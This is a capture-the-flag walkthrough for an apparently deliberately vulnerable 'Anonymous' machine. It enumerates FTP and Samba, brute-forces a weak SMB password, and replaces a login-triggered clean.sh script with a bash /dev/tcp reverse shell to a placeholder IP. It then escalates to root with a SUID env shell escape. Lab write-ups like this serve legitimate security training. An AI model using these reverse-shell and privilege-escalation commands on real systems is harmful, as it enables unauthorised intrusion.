
#  Anonymous CTF Report

##  Service Enumeration

###  Open Ports:
- **21/tcp** – FTP  
- **22/tcp** – OpenSSH 7.6p1 (Ubuntu 0.3)  
- **445/tcp** – Samba 3.1.1  

---

## 📂 FTP Enumeration

Upon accessing the FTP service, I found the following files:
- `clean.sh`
- `removed_file.log`
- `to_do.txt`

At first, nothing seemed useful. But I downloaded the files just in case they became relevant later.

---

## Samba Enumeration

Using `enum4linux`, I found:

- **Username**: `namelessone`  
- **Shares**:  
  - `print$`  
  - `pices`  
  - `IPC$`  

The `pices` share allowed anonymous access, but it didn’t contain anything important.

---

##  SMB Brute Force

I tried brute-forcing the user `namelessone` and successfully found the password:

```
Username: namelessone  
Password: 123456
```

I logged in via SMB, and although the login worked, there was nothing critical inside.

---

##  FTP Script Exploitation

After some time, I noticed that the file `removed_file.log` increased in size every time I reconnected to FTP.

I re-analyzed the `clean.sh` file and found that:

> Every time a user logs into FTP, it runs and deletes temporary files.

###  Exploit Plan:

I replaced the contents of `clean.sh` with a reverse shell:

```bash
bash -i >& /dev/tcp/<your-ip>/1234 0>&1
```

Then I uploaded it using the `put` command in FTP.

---

##  Shell Access & User Flag

Once the modified script was triggered, I got a reverse shell and accessed the machine.

✅ **Got `user.txt`**

---

##  Privilege Escalation

I started by searching for readable files in `/etc`:

```bash
find /etc/ -readable -type f 2>/dev/null
```

During enumeration, I found that `/usr/bin/env` could be exploited.

###  Exploitation:

```bash
./env /bin/sh -p
```

✅ **Got root access**  
✅ **Captured `root.txt`**

## 📌 Notes

- Always check for scripts that run on login (like `clean.sh`)
- Exploiting FTP behavior can lead to RCE
- Basic privilege escalation techniques still work in many CTFs
